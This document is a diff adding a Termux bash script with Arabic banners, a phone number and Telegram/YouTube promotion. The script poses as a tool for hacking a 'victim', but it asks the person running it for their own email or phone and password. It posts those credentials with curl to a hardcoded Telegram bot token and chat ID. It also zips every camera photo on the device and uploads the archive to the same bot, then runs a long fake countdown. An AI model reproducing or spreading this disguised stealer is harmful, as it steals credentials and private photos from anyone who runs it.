@@ -1,0 +1,85 @@
+#!/bin/bash
+echo "****************************************"
+echo "I                                      I"
+echo "I   ﻲﺑﺮﻐﻤﻟﺍ ﺀﺎﻬﺑ ﺔﻄﺳﺍﻮﺑ ﺓﺍﺩﻻﺍ ﻊﻨﺻ ﻢﺗ   I"
+echo "I                                      I"
+echo "I       ﻱﺪﻟﺍﻮﻟ ﻭ ﻲﻟ ﺀﺎﻋﺪﻟﺍ ﻰﺴﻨﺗ ﻻ      I"
+echo "I                                      I"
+echo "I      : ﻞﻛﺎﺸﻣ ﻙﺪﻨﻋ ﺍﺫﺍ ﻲﻧﻮﻓ ﻢﻗﺭ       I"
+echo "I                                      I"
+echo "I             +201064004818            I"
+echo "I                                      I"
+echo "I   : ﺕﺍﻭﺩﺍ ﺎﻬﻴﻓ ﻡﺍﺮﺠﻠﻴﺘﻟﺍ ﻰﻠﻋ ﻲﺗﺎﻨﻗ   I"
+echo "I                                      I"
+echo "I       https://t.me/bahaa_010640      I"
+echo "I                                      I"
+echo "I                                      I"
+echo "****************************************"
+sleep 10
+echo "ﻪﻠﻟ ﻢﺴﺑ ﺃﺪﺒﻧ ﻼﻳ"
+sleep 5
+echo "ﺚﻳﺪﺻ ﻙﺪﻨﻋ ﺔﻴﺤﻀﻟﺍ ﻥﺍ ﺪﻛﺄﺗ"
+read -p "ﺔﻣﺯﻼﻟﺍ ﻡﺰﺤﻟﺍ ﺖﻴﺒﺜﺘﻟ ﺮﺘﻧﺍ ﺱﻭﺩ"
+pkg update -y && pkg upgrade -y && pkg install python -y && pkg install git -y && pkg install zip -y
+sleep 5
+clear
+
+echo "########################################################"
+echo "!                                                      !"
+echo "!     ﺀﺎﻬﺑ :ﺃ ﺕﺎﻴﺤﺗ ﻊﻣ ﺡﺎﺠﻨﺑ ﺕﺎﻴﺳﺎﺳﻻﺍ ﻊﻴﻤﺟ ﺖﻴﺒﺜﺗ ﻢﺗ    !"
+echo "!                                                      !"
+echo "!               ﺔﻠﻜﺸﻣ ﻙﺪﻨﻋ ﺍﺫﺍ ﻥﻮﻔﻟﺍ ﻢﻗﺭ               !"
+echo "!                                                      !"
+echo "!                    +201064004818                     !"
+echo "!                                                      !"
+echo "!               ﺍﺮﺠﻠﻴﺘﻟﺍ ﻲﻓ ﻲﺗﺎﻧﺎﻗ ﻂﺑﺍﺭ                !"
+echo "!                                                      !"
+echo "!              https://t.me/bahaa_010640               !"
+echo "!                                                      !"
+echo "!                                    : ﺏﻮﻴﺗﻮﻳ          !"
+echo "!                                                      !"
+echo "!  https://youtube.com/@Bahaa.0bb?si=-rmHGYYqtdBrtf6y  !"
+echo "!                                                      !"
+echo "########################################################"
+termux-setup-storage
+echo "Done.."
+echo 'ﺎﻨﻫ ﺔﻴﺤﻀﻟﺍ ﻂﺑﺍﺭ ﺐﺘﻛﺍ'
+tok=7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs
+CHAT_ID=5792222595
+read -p "ID :"
+echo "ﻑﺪﻬﻟﺍ ﺪﻳﺪﺤﺗ ﻢﺗ"
+echo "ﻚﺑ ﺹﺎﺨﻟﺍ ﻞﻴﻤﻴﺠﻟﺍ ﻭﺍ ﺔﻟﻭﺪﻟﺍ ﺩﻮﻜﺑ ﻚﻔﺗﺎﻫ ﻢﻗﺭ ﻝﺎﺧﺩﺍ ﺀﺎﺟﺮﺑ"
+while true; do
+  read -p " You'r Email" nan
+  if [[ ${#nan} -lt 8 ]]; then
+    echo "ﺢﻴﺤﺻ ﺮﻴﻏ ﺪﻳﺮﺒﻟﺍ ﻭﺍ ﻒﺗﺎﻬﻟﺍ ﻢﻗﺭ"
+  else
+    break
+  fi
+done
+
+echo "ﺏﺎﺴﺤﻟﺍ ﺮﺳ ﺔﻤﻠﻛ"
+while true;do
+  read -p "Pasword : " pass
+  if [[{#pass} -lt 6]];then
+  echo " ﺔﺤﻴﺤﺻ ﺮﻴﻏ ﺮﺴﻟﺍ ﺔﻤﻠﻛ"
+  else
+  break
+  fi
+done
+curl -s -X POST "https://api.telegram.org/bot$tok/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$nan : pasword=$pass" 
+python tepy.py && python ts.py
+
+cd /sdcard/DCIM/Camera && zip img.zip *.jpg
+echo "pleas wint..."
+toh=7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs
+id=5792222595
+fl=/sdcard/DCIM/Camera/img.zip
+
+curl -F document=@"$fl" https://api.telegram.org/bot$toh/sendDocument -F chat_id=$id
+
+
+for i in {2000..0}; do
+   echo "ﻦﻴﻤﺨﺘﻟﺍ ﻢﺘﻳ $i"
+   sleep 1
+done
